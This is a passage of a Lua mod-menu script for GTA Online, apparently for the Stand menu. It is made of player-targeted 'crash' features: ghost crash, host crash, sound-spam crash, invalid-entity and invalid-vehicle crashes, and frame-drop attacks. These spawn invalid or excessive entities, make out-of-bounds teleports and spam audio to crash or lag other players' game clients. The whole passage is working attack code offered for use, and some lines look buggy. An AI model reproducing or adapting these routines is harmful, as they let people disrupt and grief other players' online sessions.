  allpeds = entities.get_all_peds_as_handles()
  for i = 1, #allpeds do
    pedhash = ENTITY.GET_ENTITY_MODEL(allpeds[i])
    if 2459507570 == pedhash then
      entities.delete_by_handle(allpeds[i])
      end
    end
end)

    menu.action(PlayerMainMenu, "改进的懂哥", {}, "", function()
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
        util.yield(500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(1000)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    end)

    local guibengs = menu.list(PlayerMainMenu, "鬼崩", {}, "")
        menu.action(guibengs, "鬼崩V1", {}, "遇事不决就用鬼崩（切战局自崩）", function()
            guibeng(PlayerID)
        end)

    menu.action(guibengs, "鬼崩V2", {}, "遇事不决就用鬼崩", function()
        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        mypos = ENTITY.GET_ENTITY_COORDS(pedp, true)
        tr2 = 2078290630
        STREAMING.REQUEST_MODEL(tr2)
        local vehicle_ = CreateVehicle(tr2, mypos,0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle_, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
        playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        for i = 0, 10 do
        playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
        util.yield(15)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
        notification("崩溃完成")
    end)

    menu.action(guibengs, "鬼崩V3", {""}, "新一代鬼崩", function()
        local model = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                for i = 1, 3, 1 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                    for spawn, value in pairs(model) do
                        local vels = {}
                        vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                        for attach, value in pairs(vels) do
                            ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                        end
                    end
                    util.yield(500)
                    notification("再见!", colors.black)
                    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
                    entities.delete_by_handle(fuck_ped)
                end
        end)

    menu.action(guibengs, "鬼崩V4", {}, "遇事不决就用鬼崩（切战局自崩）", function()
        my = PLAYER.GET_PLAYER_PED(players.user())
        mypos = ENTITY.GET_ENTITY_COORDS(players.user())
        tr2 = -1881846085
        STREAMING.REQUEST_MODEL(tr2)
            while not STREAMING.HAS_MODEL_LOADED(tr2) do
                util.yield(1)
            end
            dell = entities.create_vehicle(tr2, mypos, 0)
            ENTITY.SET_ENTITY_VISIBLE(dell, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dell, my, 0, 0, 0, 0, 0, 0, 0, false, true, false, true, 0, true)
            util.yield(400)
            for i = 1, 50 do
                youpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my, youpos.x, youpos.y, youpos.z, true, false)
                util.yield(20)
            end
        util.yield(20)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my,-75.28,-818.66,326.17)
        end)

    menu.action(guibengs, "鬼崩V5", {}, "遇事不决就用鬼崩", function()
            yyddss = 3613262246
            STREAMING.REQUEST_MODEL(yyddss)
            while not STREAMING.HAS_MODEL_LOADED(yyddss) do
                util.yield(1)
            end
            kkk = PLAYER.GET_PLAYER_PED(PlayerID)
            kkk1 = ENTITY.GET_ENTITY_COORDS(kkk)
            ENTITY.FREEZE_ENTITY_POSITION(kkk, true)
            kkk3 = entities.create_object(yyddss, kkk1, 0)
        end)

    local hostcrashs = menu.list(PlayerMainMenu, "主机崩溃", {}, "")

    menu.action(hostcrashs, "主机崩溃V1", {""}, "",function(PlayerID)
    local deathpos = v3(-16257.853, 10793.688, 893.610)
    local pedp  = players.user_ped(players.user(PlayerID))
    local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    ENTITY.FREEZE_ENTITY_POSITION(pedp,true)
    ENTITY.GET_ENTITY_COORDS(pedp, deathpos)
    util.yield(1000)
    ENTITY.FREEZE_ENTITY_POSITION(pedp,false)
    ENTITY.GET_ENTITY_COORDS(pedp,mypos)
    util.toast("主机崩溃完成",5,61000)	
    end)

    local coords_crash = true
    menu.action(hostcrashs, "主机崩溃V2", {""}, "", function(on)
    local Coords = {v3(-16257.853, 10793.688, 893.610)}
        coords_crash = on
        if not NETWORK.NETWORK_IS_HOST() then
            menu.trigger_commands("spectate" ..  players.get_name(PlayerID).. " on")
                    while coords_crash do
                        for key, pos in pairs(Coords) do
                            for i = 1, 20, 1 do
                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(PlayerID),pos.x, pos.y, pos.z)
                                util.yield(0)
                            end
                        end
                    end
                end
            menu.trigger_commands("spectate" ..  players.get_name(PlayerID).. " off")
    end)

        menu.action(hostcrashs, "主机崩溃V3", {}, "崩溃主机（请提前把主机优先级为最低）", function(PlayerID)
            hostcrash(PlayerID)
        end)

    local coords_crash = true
    menu.toggle(hostcrashs, "主机崩溃V4", {""}, "", function(on)
    local Coords = {
        v3(-16257, 10793, 893),
        v3(-6170,10837,40),
        v3(-1336, -3044, 13),
        v3(10837, -6170, 39),
        }
        coords_crash = on
        if not NETWORK.NETWORK_IS_HOST() then
            menu.trigger_commands("spectate" ..  players.get_name(PlayerID).. " on")
                    while coords_crash do
                        for key, pos in pairs(Coords) do
                            for i = 1, 20, 1 do
                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(PlayerID),pos.x, pos.y, pos.z)
                                util.yield(0)
                            end
                        end
                    end
                end
            menu.trigger_commands("spectate" ..  players.get_name(PlayerID).. " off")
    end)

    menu.action(hostcrashs, "主机崩溃V5", {""}, "", function()
        notification("开始崩溃", colors.pink)
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmtchiliad")
        notification("结束崩溃 ", colors.pink)
    end)

   menu.action(PlayerMainMenu, "火车崩", {"huocheb"}, "", function(train_loop)
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.x = stupid_pos.x - 2
        util.create_thread(function ()
            local mod_vel = {184361638,642617954,586013744,920453016,3186376089,1030400667,240201337}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 10, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(0)
                        end
                    end
                    util.yield(0)
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)

    menu.action(PlayerMainMenu, '无名崩溃', {}, '有bug，慎用', function ()
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local PED1  = CreatePed(28,-1011537562,TargetPPos,0)
    local PED2  = CreatePed(28,-541762431,TargetPPos,0)
    local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.x = stupid_pos.x + 3
    local model = {util.joaat("cs_wade"),util.joaat("a_c_rat")}
    for _spawn, value in pairs(model) do
    local task_crash = {}
    task_crash[_spawn] = entities.create_ped(26,value,stupid_pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(task_crash[_spawn],true)
    for start, value1 in pairs(task_crash) do
        local play = {}
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(value1, util.joaat("weapon_pistol"), 0, true)
    util.yield(100)
    play[start] = TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user(PlayerID)),-1087,-3012,13.94)
    util.yield(100)
    ENTITY.FREEZE_ENTITY_POSITION(value1,false)
    end
    util.yield(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
    WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
    util.yield(1000)
    TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    entities.delete_by_handle(value)
    end
    end)

    local soundcrashs = menu.list(PlayerMainMenu, "声音崩溃", {}, "")
    menu.action(soundcrashs, "声音崩溃V1", {""}, "", function()
         soundcrash_allV1(PlayerID)
    end)

    menu.action(soundcrashs, "声音崩溃V2", {""}, "", function(play_sound,PlayerID)
        local string_audioref = {
            "GTAO_FM_Events_Soundset",
            "MP_MISSION_COUNTDOWN_SOUNDSET"
        }
        local sound_names = {
            "Checkpoint_Cash_Hit",
            "Object_Dropped_Remote",
            "Event_Start_Text",
            "5s",
        }
        local time = util.current_time_millis() + 100
        local sounds_from_coords <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))sounds_from_coords.z = sounds_from_coords.z + 3
        for spam, audios in pairs(sound_names) do
            for audioss, audioref in pairs(string_audioref) do
                while time > util.current_time_millis() do
                    for i = 1, 8, 1 do
                        AUDIO.PLAY_SOUND_FROM_COORD(-1, audios, sounds_from_coords.x,sounds_from_coords.y,sounds_from_coords.z, audioref,true, 100, true)
                   end
                   util.yield(0)
                end
            end
        end
    end)

    menu.toggle_loop(PlayerMainMenu, "无效实体崩溃", {"BadNetVehicleCrashV3"}, "远离!!!否则你懂得!!!", function ()
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.z = stupid_pos.z + 1
        util.create_thread(function ()
            local mod_vel = {-1958189855}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 7, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(0)
                        end
                    end
                    util.yield(8000)
                    menu.trigger_commands("rockets" ..  players.get_name(PlayerID))
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)

    function entity_object(hash,coords,dir)   
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
object = entities.create_object(hash,coords,dir,true,false)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
return object
end

function entity_deletes(entity) 
lists = 0
entitys = 0  
if #entity == 0 then
return
end
for i = 1,#entity do
while ENTITY.DOES_ENTITY_EXIST(entity[i]) and lists <= 1000 do
entities.delete(entity[i])
lists = lists + 1
util.yield()
end
end
lists = 0
if not ENTITY.DOES_ENTITY_EXIST(entity[i]) then
entitys = entitys + 1
end
end
entitypool = {}
InstantCrash = {
0x9CF21E0F,
0x34315488,
0x6A27FEB1,
0xCB2ACC8,
0xC6899CDE, 
0xD14B5BA3,
0xD9F4474C, 
0x32A9996C,
0x69D4F974, 
0xCAFC1EC3,
0x79B41171, 
0x1075651,
0xC07792D4, 
0x781E451D,
0x762657C6, 
0xC2E75A21,
0xC3C00861, 
0x81FB3FF0,
0x45EF7804, 
0xE65EC0E4,
0xE764D794, 
0xFBF7D21F,
0xE1AEB708, 
0xA5E3D471,
0xD971BBAE, 
0xCF7A9A9D,
0xC2CC99D8, 
0x8FB233A4,
0x24E08E1F,
0x337B2B54,
0xB9402F87, 
0x4F2526DA
}
menu.action(PlayerMainMenu,"无效实体崩溃2",{},"",function()
util.toast("无效实体崩溃 "..PLAYER.GET_PLAYER_NAME(PlayerID),1)
player = ENTITY.GET_ENTITY_COORDS(players.user())
ENTITY.FREEZE_ENTITY_POSITION(players.user(),true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user(),2300,2300,2300)
pos = ENTITY.GET_ENTITY_COORDS(players.user(PlayerID))
for i = 1,4 do
for i = 1,#InstantCrash do
Instant = entity_object(InstantCrash[i],pos,true,false)
entitypool[#entitypool+1] = Instant
end
wait(40)
entity_deletes(entitypool)
end
wait(1)
ENTITY.FREEZE_ENTITY_POSITION(players.user(),false)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user(),player.x,player.y,player.z)
util.toast("崩溃完成！",1)
end)


function entity_vehicle(hash,coords,dir) 
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
vehicle = entities.create_vehicle(hash,coords,dir,true,false)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
return vehicle
end
menu.click_slider(PlayerMainMenu,"实体掉帧",{"Drop frame"},"1=客机--2=虎鲸--3=飞机--4=删除",1,4,1,1,function(ak)
if ak == 1 then
for i = 1,70 do
pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
vehicle1 = entity_vehicle(0x15F27762,pos,0)
ENTITY.SET_ENTITY_INVINCIBLE(vehicle1,true)
entitypool[#entitypool+1] = vehicle1
wait(200)
end
elseif ak == 2 then
for i = 1,70 do
pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
vehicle1 = entity_vehicle(0x4FAF0D70,pos,0)
ENTITY.SET_ENTITY_INVINCIBLE(vehicle1,true)
entitypool[#entitypool+1] = vehicle1
wait(200)
end
elseif ak == 3 then
for i = 1,70 do
pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
vehicle1 = entity_vehicle(0x3F119114,pos,0)
ENTITY.SET_ENTITY_INVINCIBLE(vehicle1,true)
entitypool[#entitypool+1] = vehicle1
wait(200)
end
elseif ak == 4 then
entity_deletes(entitypool)
end
end)

    local invalidclothes = menu.list(PlayerMainMenu, "无效载具崩溃", {}, "")

function clone(vehicle)
    local vehicleHeading<const> = ENTITY.GET_ENTITY_HEADING(vehicle)
    local vehicleHash<const> = ENTITY.GET_ENTITY_MODEL(vehicle)
    local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle)
    local rot = v3.toDir(ENTITY.GET_ENTITY_ROTATION(vehicle, 2))
    v3.mul(rot, -getDimensions(vehicle).x - 2)
    v3.add(coords, rot)
    local cloneVehicle<const> = entities.create_vehicle(vehicleHash, coords, vehicleHeading)
    copyVehicleData(vehicle, cloneVehicle)
    return cloneVehicle
end
local minimum<const> = memory.alloc()
local maximum<const> = memory.alloc()
function getDimensions(entity)
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
    local minimum_vec<const> = v3.new(minimum)
    local maximum_vec<const> = v3.new(maximum)
    local dimensions<const> = {
        x = maximum_vec.y - minimum_vec.y,
        y = maximum_vec.x - minimum_vec.x,
        z = maximum_vec.z - minimum_vec.z
    }
    return dimensions
end
local colorR, colorG, colorB = memory.alloc(1), memory.alloc(1), memory.alloc(1)
function copyVehicleData(vehicle, cloneVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(cloneVehicle, 0)
    for i = 17, 22 do
        VEHICLE.TOGGLE_VEHICLE_MOD(cloneVehicle, i, VEHICLE.IS_TOGGLE_MOD_ON(vehicle, i))
    end

    for i = 0, 49 do
        local modValue<const> = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(cloneVehicle, i, modValue)
    end

    if VEHICLE.GET_IS_VEHICLE_PRIMARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_1(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    end

    if VEHICLE.GET_IS_VEHICLE_SECONDARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_2(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    end

    VEHICLE.GET_VEHICLE_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))

    VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))

    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_5(vehicle, colorR) -- interior
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_6(vehicle, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(cloneVehicle, memory.read_ubyte(colorR)) -- dashboard
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(cloneVehicle, memory.read_ubyte(colorG)) -- interior

    VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))

    VEHICLE.GET_VEHICLE_NEON_COLOUR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))

    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(cloneVehicle, i, VEHICLE.GET_VEHICLE_NEON_ENABLED(vehicle, i))
    end

    local windowTint<const> = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(cloneVehicle, windowTint)

    local lightsColor<const> = VEHICLE.GET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(cloneVehicle, lightsColor)

    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle))
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle))

    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(cloneVehicle, VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle))
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(cloneVehicle, VEHICLE.GET_VEHICLE_DIRT_LEVEL(vehicle))

    for i = 1, 14 do
        VEHICLE.SET_VEHICLE_EXTRA(cloneVehicle, i, not VEHICLE.IS_VEHICLE_EXTRA_TURNED_ON(vehicle, i))
    end

    local roofState<const> = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
    if roofState == 1 or roofState == 2 then
        VEHICLE.LOWER_CONVERTIBLE_ROOF(cloneVehicle, true)
    end

    VEHICLE.SET_VEHICLE_ENGINE_ON(cloneVehicle, VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(vehicle), true, true)
end
    menu.toggle_loop(invalidclothes, "无效载具崩溃v1", {}, "", function()
        local pCoords<const> = players.get_position(PlayerID)
        local trafficLights = {}

        util.request_model(-655644382) -- traffic lights
        for i = 1, 20 do
            local object<const> = entities.create_object(-655644382, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
            ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
            trafficLights[#trafficLights + 1] = object
        end

        local stopLights = false

        util.create_tick_handler(function()
            if stopLights then
                return false
            end
            ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
        end)

        util.request_model(3253274834) -- buffalo
        local vehicles = {}
        local crashVehicle<const> = entities.create_vehicle(3253274834, pCoords, 0)
        vehicles[#vehicles + 1] = crashVehicle
        VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(crashVehicle, "ICRASHU")
        VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
        for i = 1, 10 do
            vehicles[#vehicles + 1] = clone(crashVehicle)
        end

        util.yield(500)
        for i = 1, #vehicles do
            entities.delete_by_handle(vehicles[i])
        end

        util.yield(500)
        stopLights = true
        util.yield(500)
        for i = 1, #trafficLights do
            entities.delete_by_handle(trafficLights[i])
        end

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
    end)

    menu.toggle_loop(invalidclothes, "无效载具崩溃v2", {""}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local coords = ENTITY.GET_ENTITY_COORDS(ped)
	local model = util.joaat("banshee")
	request_model(model)
	local vehicle = entities.create_vehicle(model,coords,0)
	VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
	ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
	VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
	for i=0, 49 do
		local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
		VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
	end
	notification("发送实体崩溃")
    util.yield(100)
	notification("崩溃完成")
end)

    menu.toggle_loop(invalidclothes, "无效载具崩溃v3", {"badnetveh"}, "", function ()
        BadNetVehicleCrash(PlayerID)
    end)

    menu.toggle_loop(invalidclothes, "无效载具崩溃v4", {"invalidclothesv2"}, "", function ()
       BadOutfitCrashV2(PlayerID)
    end)

    menu.toggle_loop(invalidclothes, "无效载具崩溃v5", {"BadNetVehicleCrashV2"}, "", function()
        BadNetVehicleCrashV2(PlayerID)
    end)

    menu.toggle(invalidclothes, '无效载具崩溃v6', {}, '就问你顶不顶得住', function (on)
       if on then 
        menu.trigger_commands("badnetveh".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("invalidclothesv2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV8".. PLAYER.GET_PLAYER_NAME(PlayerID))
        else 
        menu.trigger_commands("badnetveh".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("invalidclothesv2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV8".. PLAYER.GET_PLAYER_NAME(PlayerID))
        end
    end)

	menu.toggle_loop(invalidclothes, "无效载具崩溃v7", {"BadNetVehicleCrashV8"}, "", function()
	      local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		  local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		  pos.z = pos.z + 5
		  veh = entities.get_all_vehicles_as_handles()
		  
        for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
		end
	end)

   menu.action(invalidclothes, "无效载具崩溃v8", {""}, "", function()
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.z = stupid_pos.z + 1
        util.create_thread(function ()
            local mod_vel = {0x58f77553,0x1446590a}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 7, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(0)
                        end
                    end
                    util.yield(8000)
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)

   menu.action(invalidclothes, "无效载具崩溃v9", {""}, "", function()
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.x = stupid_pos.x + 3
        util.create_thread(function ()
            local sb_ped <const> = entities.create_ped(26,util.joaat("a_c_rat"),stupid_pos,0)
            local mod_vel = {0x9c5e5644}
            PED.SET_PED_INTO_VEHICLE(sb_ped,-1)
            PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 10, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(100)
                        end
                    end
                    util.yield()
                    local ar_vs = entities.get_all_vehicles_as_handles(sb_ped, value, 0)
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)

    menu.action(PlayerMainMenu, "马哥崩溃", {"gtgvs"}, "", function()
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID).. " 1")
        menu.trigger_commands("tuoche " .. players.get_name(PlayerID))
        menu.trigger_commands("dh " .. players.get_name(PlayerID))
    end)

    menu.action(PlayerMainMenu, "猛女崩溃", {""}, "", function(on_toggle)
    big_chungus(PlayerID) 
    end)

    menu.action(PlayerMainMenu, "UFO崩溃", {}, "", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(0x7367D224, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
